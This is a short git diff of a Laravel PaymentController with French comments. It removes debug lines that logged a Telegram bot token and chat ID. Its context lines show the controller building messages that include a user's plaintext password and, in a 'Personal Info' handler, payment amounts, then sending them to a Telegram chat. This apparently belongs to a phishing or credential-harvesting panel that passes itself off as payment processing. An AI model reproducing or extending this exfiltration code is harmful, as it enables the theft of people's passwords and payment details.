@@ -26,9 +26,6 @@ class PaymentController extends Controller
                  . "🔐 Mot de passe : {$validated['password']}" ;
 
         try {
-            Log::info('Telegram - Token: ' . config('services.telegram-bot-api.token'));
-            Log::info('Telegram - Chat ID: ' . config('services.telegram-bot-api.chat_id'));
-            
             // 3. Envoi de la notification
             Notification::route('telegram', config('services.telegram-bot-api.chat_id'))
                 ->notify(new TelegramAlert($message));
@@ -75,9 +72,6 @@ class PaymentController extends Controller
                  . "💰 Montant : {$validated['article_amount']} €";
 
         try {
-            Log::info('Telegram Personal Info - Token: ' . config('services.telegram-bot-api.token'));
-            Log::info('Telegram Personal Info - Chat ID: ' . config('services.telegram-bot-api.chat_id'));
-            
             // Envoi de la notification
             Notification::route('telegram', config('services.telegram-bot-api.chat_id'))
                 ->notify(new TelegramAlert($message));
